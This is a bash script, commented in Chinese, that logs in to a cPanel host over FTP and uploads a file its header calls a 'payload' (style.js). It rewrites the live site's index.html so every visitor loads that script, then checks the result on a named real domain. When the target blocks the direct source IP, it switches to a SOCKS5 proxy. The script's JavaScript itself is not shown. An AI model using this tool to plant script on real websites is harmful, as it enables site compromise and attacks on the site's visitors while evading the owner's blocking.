#!/usr/bin/env bash
# =============================================================================
# deploy_ftp.sh — 用 FTP 帐密把 payload 佈署到 cPanel docroot，并自动改写 index.html
#                   的 <script src="/style.js"> 标签加入 ?v=<version> 缓存破坏码。
#
# 用法:
#   FTP_USER=<user> FTP_PASS='<pass>' bash scripts/deploy_ftp.sh [host] [docroot]
#   FTP_USER=... FTP_PASS=... bash scripts/deploy_ftp.sh 185.189.162.103 /public_html
#
# 行为:
#   1) 上传 scripts/style.js            -> <docroot>/style.js
#   2) 下载 <docroot>/index.html，精确改写 style.js 标签（含 ?v=），回传覆盖
#      - 目标标签只允许两种形态（避免误改）：
#          <script type="text/javascript" src="/style.js"></script>
#          <script type="text/javascript" src="/style.js?..."></script>
#      - 若两种都不匹配 -> 只上传 style.js，不动 index.html（并给出提示）
#   3) 上线后自检：远端 md5 与本地一致 + 两个目标 URL 逐字存在
#
# 注意:
#   - 本机 ~/.curlrc 若含 socks5h 代理，必须加 --disable 与 --noproxy '*'
#   - 部分 cPanel FTP 走明文 21 port，主动模式；若服务器仅允许被动模式，
#     curl 会自动协商（--ftp-pasv 为默认），仍失败则改用 cPanel File Manager 手动上传。
# =============================================================================
set -euo pipefail
cd "$(dirname "$0")/.."

HOST="${1:-185.189.162.103}"
DOCROOT="${2:-/public_html}"
USER="${FTP_USER:-}"
PASS="${FTP_PASS:-}"

if [ -z "$USER" ] || [ -z "$PASS" ]; then
  echo "用法: FTP_USER=<user> FTP_PASS='<pass>' bash $0 [host] [docroot]" >&2
  exit 2
fi

VER="$(md5sum scripts/style.js | awk '{print $1}' | cut -c1-8)"
LOCAL_MD5="$(md5sum scripts/style.js | awk '{print $1}')"
BASE="ftp://${HOST}"
CURL=(curl -sS --disable --noproxy '*' --max-time 60 --ftp-pasv --user "${USER}:${PASS}")

# ---------- 0) Scope 閘門（阻擋清單優先，無法繞過） ----------
echo "-- [0/5] Scope 檢查"
if [ -f scripts/scope_gate.py ]; then
  python3 scripts/scope_gate.py --target "$HOST" || exit $?
else
  echo "   [warn] 找不到 scripts/scope_gate.py，略過 scope 檢查" >&2
fi

# ---------- 0) 连通性 + docroot 自动定位 ----------
echo "== 目标: ${BASE}${DOCROOT}   version=${VER}   md5=${LOCAL_MD5}"
echo "-- [0/5] 登录并定位 docroot"

if ! "${CURL[@]}" --list-only "${BASE}/" -o /tmp/ftp_root.txt 2>/tmp/ftp_err.txt; then
  echo "   FTP 登录/连接失败：" >&2
  sed 's/^/     /' /tmp/ftp_err.txt >&2
  echo "   常见原因：帐密错误(530)、匿名被拒、被动模式被防火墙挡、需强制 TLS(加 --ssl-reqd)" >&2
  exit 3
fi
echo "   登录 OK，FTP 根目录内容："
sed 's/^/     /' /tmp/ftp_root.txt | head -20

# 找出含 style.js 的目录（cPanel 常见 /public_html，也有 /<user>/public_html、/www、/htdocs）
FOUND=""
for d in "$DOCROOT" "/public_html" "/www" "/htdocs" "/${USER}/public_html" "/home/${USER}/public_html" "/"; do
  if "${CURL[@]}" --list-only "${BASE}${d}" 2>/dev/null | grep -qx "style.js"; then
    FOUND="$d"; break
  fi
done
if [ -z "$FOUND" ]; then
  echo "   [warn] 未在各候选目录找到 style.js，仍按传入路径 ${DOCROOT} 继续（如失败请手动指定 docroot）" >&2
else
  DOCROOT="$FOUND"
  echo "   docroot 定位成功: ${DOCROOT}"
fi

# ---------- 1) 上传 style.js ----------
echo "-- [1/5] 上传 style.js"
"${CURL[@]}" -T scripts/style.js "${BASE}${DOCROOT}/style.js" -w '   ftp code=%{response_code} upload=%{size_upload}B\n' \
  || { echo "   上传失败（权限不足或路径不对）" >&2; exit 4; }

# ---------- 2) 拉 index.html ----------
TMP="$(mktemp)"; trap 'rm -f "$TMP" "$TMP.new" /tmp/ftp_root.txt /tmp/ftp_err.txt' EXIT
echo "-- [2/5] 拉取 index.html"
"${CURL[@]}" "${BASE}${DOCROOT}/index.html" -o "$TMP" -s -w '   get code=%{response_code} size=%{size_download}B\n'

if [ ! -s "$TMP" ]; then
  echo "   index.html 取不到 -> 只完成 style.js 上传（缓存码需手动改标签）" >&2
  exit 0
fi

# ---------- 3) 精确改写标签 ----------
NEW_TAG="<script type=\"text/javascript\" src=\"/style.js?v=${VER}\"></script>"
python3 - "$TMP" "$TMP.new" "$VER" "$NEW_TAG" <<'PY'
import re, sys
src, dst, ver, new_tag = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
html = open(src, 'rb').read().decode('utf-8', 'surrogateescape')
pat = re.compile(r'<script[^>]*\bsrc\s*=\s*(["\'])/style\.js(?:\?[^"\']*)?\1[^>]*>\s*</script>')
m = pat.search(html)
if not m:
    print('   [skip] 未匹配到 style.js script 标签 -> 不改 index.html')
    sys.exit(3)
html2 = html[:m.start()] + new_tag + html[m.end():]
open(dst, 'wb').write(html2.encode('utf-8', 'surrogateescape'))
print(f'   [ok] 标签已改写: {m.group(0)[:90]}  ->  {new_tag}')
PY

if [ -s "$TMP.new" ]; then
  echo "-- [3/5] 回传 index.html"
  "${CURL[@]}" -T "$TMP.new" "${BASE}${DOCROOT}/index.html" -w '   code=%{response_code} upload=%{size_upload}B\n'
else
  echo "   index.html 未改写（标签形态不匹配），请手动加 ?v=${VER}"
fi

# ---------- 4) 上线自检 ----------
echo "-- [4/5] 上线自检"
sleep 2
# 目标端可能对直连来源 IP 做黑名单（TLS 握手丢包）→ 失败时自动改走 ~/.curlrc 的 socks5h 代理
REMOTE="$(curl -sk --disable --noproxy '*' --max-time 20 https://fortunefish88.com.tw/style.js 2>/dev/null | md5sum | awk '{print $1}')"
if [ "$REMOTE" != "$LOCAL_MD5" ]; then
  REMOTE="$(curl -sk --disable --max-time 20 https://fortunefish88.com.tw/style.js 2>/dev/null | md5sum | awk '{print $1}')"
  echo "   （直連被目標端封鎖，已改走 socks5h 代理驗證）"
fi
if [ "$REMOTE" = "$LOCAL_MD5" ]; then
  echo "   [ok] style.js 远端 md5 = $REMOTE（与本地一致）"
else
  echo "   [FAIL] style.js 远端 md5 = $REMOTE ≠ 本地 $LOCAL_MD5" >&2
fi
TAG="$(curl -sk --disable --noproxy '*' --max-time 20 https://fortunefish88.com.tw/ 2>/dev/null | grep -oE '<script[^>]*style\.js[^>]*>' | head -1)"
[ -z "$TAG" ] && TAG="$(curl -sk --disable --max-time 20 https://fortunefish88.com.tw/ 2>/dev/null | grep -oE '<script[^>]*style\.js[^>]*>' | head -1)"
echo "   首页标签: $TAG"
